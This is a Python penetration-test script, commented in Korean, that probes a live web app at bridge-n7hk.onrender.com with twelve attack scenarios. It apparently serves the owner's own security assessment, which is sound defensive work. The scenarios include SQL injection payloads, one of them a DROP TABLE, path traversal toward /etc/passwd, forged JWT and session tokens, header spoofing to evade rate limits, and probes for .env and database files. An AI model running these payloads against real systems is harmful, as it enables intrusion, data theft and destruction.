r"""
penetration_test.py — 실제 해커 관점 침투 테스트
대상: https://bridge-n7hk.onrender.com (Live)

공격 시나리오:
  1. Auth Bypass — admin 엔드포인트 인증 없이 접근
  2. SQL Injection — 검색/필터 파라미터에 payload 주입
  3. Path Traversal — 파일 경로에 ../ 주입
  4. Rate Limit Bypass — IP 회피 / 헤더 spoofing
  5. Session Hijack — 탈취된 세션 토큰 재사용 시뮬레이션
  6. CSRF — Origin 헤더 조작
  7. PII 노출 — 공개 엔드포인트에서 개인정보 조회
  8. Timing Attack — 로그인 응답 시간 차이로 유저 존재 여부 판별
  9. JWT 조작 — 알고리즘 변경 (HS256 → none)
  10. Mass Assignment — 권한 필드 직접 수정 시도

모든 공격은 비파괴적 (읽기만, 데이터 변경 시도 X).
"""
from __future__ import annotations
import base64
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

TARGET = "https://bridge-n7hk.onrender.com"


@dataclass
class Finding:
    severity: str  # CRITICAL/HIGH/MEDIUM/LOW/INFO
    test: str
    endpoint: str
    detail: str
    response_snippet: str = ""


findings: list[Finding] = []


def _req(method: str, path: str, headers: dict | None = None,
         data: bytes | None = None, timeout: int = 15) -> tuple[int, dict, bytes]:
    url = TARGET + path
    req = urllib.request.Request(url, data=data, method=method,
                                  headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
        except Exception:
            body = b""
        return e.code, dict(e.headers) if e.headers else {}, body
    except Exception as e:
        return 0, {}, str(e).encode()


def test_1_auth_bypass():
    """인증 없이 admin 엔드포인트 접근"""
    endpoints = [
        "/api/admin/candidates",
        "/api/admin/inquiries",
        "/api/admin/stats",
        "/api/admin/db/dump",
        "/api/admin/candidates/export?format=csv",
        "/api/admin/sessions",
    ]
    for ep in endpoints:
        status, _, body = _req("GET", ep)
        snippet = body[:100].decode("utf-8", errors="ignore")
        if status == 200:
            findings.append(Finding(
                "CRITICAL", "Auth Bypass", ep,
                "인증 없이 200 반환 — 인증 누락",
                snippet
            ))
        elif status in (401, 403):
            pass  # 정상 차단
        else:
            findings.append(Finding(
                "INFO", "Auth Bypass", ep,
                f"예상외 상태코드 {status}", snippet
            ))


def test_2_sql_injection():
    """검색 파라미터에 SQLi payload"""
    payloads = [
        "'", "' OR 1=1--", "' UNION SELECT NULL--", "1' AND SLEEP(5)--",
        "admin'--", "\"; DROP TABLE candidates;--",
    ]
    public_endpoints = [
        "/api/public/talents?q=",
        "/api/public/jobs?region=",
        "/api/search?q=",
    ]
    for ep in public_endpoints:
        for p in payloads:
            ep_full = ep + urllib.parse.quote(p)
            t0 = time.time()
            status, _, body = _req("GET", ep_full)
            elapsed = time.time() - t0
            body_text = body[:500].decode("utf-8", errors="ignore").lower()

            # SQL 에러 키워드 감지
            sql_errors = ["sqlite", "syntax error", "near", "database is",
                          "no such column", "operationalerror", "traceback"]
            if any(e in body_text for e in sql_errors):
                findings.append(Finding(
                    "HIGH", "SQL Injection", ep_full,
                    "SQL 에러 메시지 응답에 노출됨", body_text[:200]
                ))
            # Time-based 감지 (5초 이상 응답)
            if elapsed > 4.5:
                findings.append(Finding(
                    "HIGH", "SQL Injection (Time-based)", ep_full,
                    f"{elapsed:.1f}초 응답 지연 — Blind SQLi 의심", ""
                ))


def test_3_path_traversal():
    """파일 경로에 ../ 주입"""
    payloads = [
        "../etc/passwd", "..%2f..%2fetc%2fpasswd",
        "....//....//etc/passwd", "/etc/passwd%00.png",
    ]
    targets = [
        "/api/files/{}", "/api/admin/download/{}",
        "/api/sign-url?key={}", "/static/{}",
    ]
    for t in targets:
        for p in payloads:
            ep = t.format(urllib.parse.quote(p))
            status, _, body = _req("GET", ep)
            body_text = body[:500].decode("utf-8", errors="ignore")
            if "root:" in body_text or "passwd" in body_text.lower() and status == 200:
                findings.append(Finding(
                    "CRITICAL", "Path Traversal", ep,
                    "/etc/passwd 파일 읽기 성공", body_text[:200]
                ))


def test_4_rate_limit_bypass():
    """Rate limit 회피 시도 — X-Forwarded-For 헤더 변조"""
    ep = "/api/apply"
    blocked_on = -1
    for i in range(15):
        fake_ip = f"10.0.0.{i}"
        status, _, _ = _req("POST", ep,
            headers={"X-Forwarded-For": fake_ip, "Content-Type": "application/json"},
            data=b"{}")
        if status == 429:
            blocked_on = i
            break
    if blocked_on < 0:
        findings.append(Finding(
            "MEDIUM", "Rate Limit Bypass", ep,
            "X-Forwarded-For 변조로 15회 차단 없음 — 헤더 신뢰 의심", ""
        ))


def test_5_session_hijack_indicator():
    """세션 토큰 없는데 쿠키만 있는 경우 403인지 확인"""
    status, _, _ = _req("GET", "/api/admin/candidates",
        headers={"Cookie": "admin_session=fake_token_aaaaaaaaaaaaaaaaaaaa"})
    if status == 200:
        findings.append(Finding(
            "CRITICAL", "Session Hijack", "/api/admin/candidates",
            "가짜 세션 쿠키로 200 반환 — 세션 검증 실패", ""
        ))


def test_6_csrf_origin_bypass():
    """관리자 mutation에 악성 Origin으로 요청"""
    status, _, body = _req("POST", "/api/admin/candidates",
        headers={"Origin": "https://evil.com", "Content-Type": "application/json"},
        data=b'{"name":"test"}')
    body_text = body[:300].decode("utf-8", errors="ignore")
    if status == 200 or (status != 403 and "forbidden" not in body_text.lower()):
        if status not in (401,):  # 401 auth 먼저 걸리는건 OK
            findings.append(Finding(
                "HIGH", "CSRF", "/api/admin/candidates",
                f"악성 Origin 차단 안 됨 (status={status})", body_text[:200]
            ))


def test_7_pii_exposure():
    """공개 엔드포인트에서 PII 조회 시도"""
    public = [
        "/api/public/talents",
        "/api/public/jobs",
    ]
    PII_KEYS = ["email", "phone", "full_name", "kakaotalk", "passport",
                "mobile_phone", "dob", "home_address"]
    for ep in public:
        status, _, body = _req("GET", ep + "?limit=5")
        if status != 200:
            continue
        try:
            j = json.loads(body)
        except Exception:
            continue
        body_text = json.dumps(j).lower()
        leaked = [k for k in PII_KEYS if f'"{k}"' in body_text]
        if leaked:
            findings.append(Finding(
                "HIGH", "PII Exposure", ep,
                f"공개 응답에 PII 키 노출: {leaked}",
                body_text[:300]
            ))


def test_8_timing_login():
    """로그인 응답 시간으로 유저 존재 여부 판별 가능?"""
    ep = "/api/admin/login"
    existing_email_times = []
    fake_email_times = []
    # 존재할 법한 이메일
    for _ in range(5):
        t0 = time.time()
        _req("POST", ep, headers={"Content-Type": "application/json"},
             data=b'{"email":"admin@bridgejob.co.kr","password":"wrong"}')
        existing_email_times.append(time.time() - t0)
    # 명백히 존재하지 않는 이메일
    for _ in range(5):
        t0 = time.time()
        _req("POST", ep, headers={"Content-Type": "application/json"},
             data=b'{"email":"nonexistent_xxxxx_qqqq@example.invalid","password":"wrong"}')
        fake_email_times.append(time.time() - t0)

    avg_exist = sum(existing_email_times) / len(existing_email_times)
    avg_fake = sum(fake_email_times) / len(fake_email_times)
    diff = abs(avg_exist - avg_fake)
    # 100ms 이상 차이나면 구별 가능
    if diff > 0.1:
        findings.append(Finding(
            "MEDIUM", "Timing Attack", ep,
            f"존재 이메일 vs 가짜 이메일 응답시간 차이 {diff*1000:.0f}ms",
            f"existing={avg_exist:.3f}s fake={avg_fake:.3f}s"
        ))


def test_9_jwt_none_algorithm():
    """JWT alg:none 공격 — 서명 검증 우회 시도"""
    # header.payload.signature (alg=none)
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').rstrip(b"=").decode()
    jwt = f"{header}.{payload}."

    status, _, body = _req("GET", "/api/admin/candidates",
        headers={"Authorization": f"Bearer {jwt}"})
    if status == 200:
        findings.append(Finding(
            "CRITICAL", "JWT none algorithm", "/api/admin/candidates",
            "alg:none JWT로 인증 통과 — 서명 미검증", ""
        ))


def test_10_sensitive_files():
    """민감 파일 공개 접근"""
    sensitive = [
        "/.env", "/.git/config", "/master.db", "/.bridge.key",
        "/api_server.py", "/config.json", "/.DS_Store",
        "/admin.php", "/wp-login.php",  # 허니팟도 확인
    ]
    for f in sensitive:
        status, _, body = _req("GET", f)
        if status == 200 and len(body) > 50:
            findings.append(Finding(
                "CRITICAL", "Sensitive File Exposure", f,
                f"민감 파일 공개됨 (size={len(body)})", body[:150].decode(errors="ignore")
            ))


def test_11_http_methods():
    """허용되지 않아야 할 HTTP 메소드"""
    for method in ["TRACE", "OPTIONS", "PUT", "DELETE", "PATCH"]:
        status, _, _ = _req(method, "/api/admin/candidates")
        if method == "TRACE" and status == 200:
            findings.append(Finding(
                "MEDIUM", "HTTP TRACE enabled", "/api/admin/candidates",
                "TRACE 메소드 활성 — XST 공격 가능", ""
            ))


def test_12_headers_security():
    """보안 헤더 점검"""
    status, headers, _ = _req("GET", "/")
    required = {
        "strict-transport-security": "HSTS",
        "x-content-type-options": "X-Content-Type-Options",
        "x-frame-options": "X-Frame-Options",
        "content-security-policy": "CSP",
    }
    # case-insensitive 검사
    lower_headers = {k.lower(): v for k, v in headers.items()}
    for h, name in required.items():
        if h not in lower_headers:
            findings.append(Finding(
                "LOW", "Missing Security Header", "/",
                f"{name} 헤더 미설정", ""
            ))


def main():
    print(f"[PENTEST] 대상: {TARGET}")
    print(f"[PENTEST] 비파괴 공격 12개 시나리오 실행\n")

    tests = [
        ("1. Auth Bypass", test_1_auth_bypass),
        ("2. SQL Injection", test_2_sql_injection),
        ("3. Path Traversal", test_3_path_traversal),
        ("4. Rate Limit Bypass", test_4_rate_limit_bypass),
        ("5. Session Hijack", test_5_session_hijack_indicator),
        ("6. CSRF Origin", test_6_csrf_origin_bypass),
        ("7. PII Exposure", test_7_pii_exposure),
        ("8. Timing Attack", test_8_timing_login),
        ("9. JWT none alg", test_9_jwt_none_algorithm),
        ("10. Sensitive Files", test_10_sensitive_files),
        ("11. HTTP Methods", test_11_http_methods),
        ("12. Security Headers", test_12_headers_security),
    ]
    for name, fn in tests:
        print(f"  [{name}] 실행 중...", flush=True)
        try:
            fn()
        except Exception as e:
            print(f"    ! 실행 오류: {e}")
        print(f"    → 누적 findings: {len(findings)}")

    print(f"\n{'='*60}")
    print(f"PENTEST 결과 — 총 {len(findings)}건 발견\n")
    by_sev = {}
    for f in findings:
        by_sev.setdefault(f.severity, []).append(f)
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        items = by_sev.get(sev, [])
        if not items:
            continue
        print(f"\n[{sev}] {len(items)}건")
        for f in items:
            print(f"  - {f.test} @ {f.endpoint}")
            print(f"    {f.detail}")
            if f.response_snippet:
                print(f"    응답: {f.response_snippet[:150]}")

    # 파일 저장
    import os
    from pathlib import Path
    report = Path(__file__).resolve().parent.parent / "logs" / "pentest_report.json"
    report.parent.mkdir(exist_ok=True)
    with open(report, "w", encoding="utf-8") as f:
        json.dump([vars(x) for x in findings], f, indent=2, ensure_ascii=False)
    print(f"\n[SAVED] {report}")


if __name__ == "__main__":
    main()
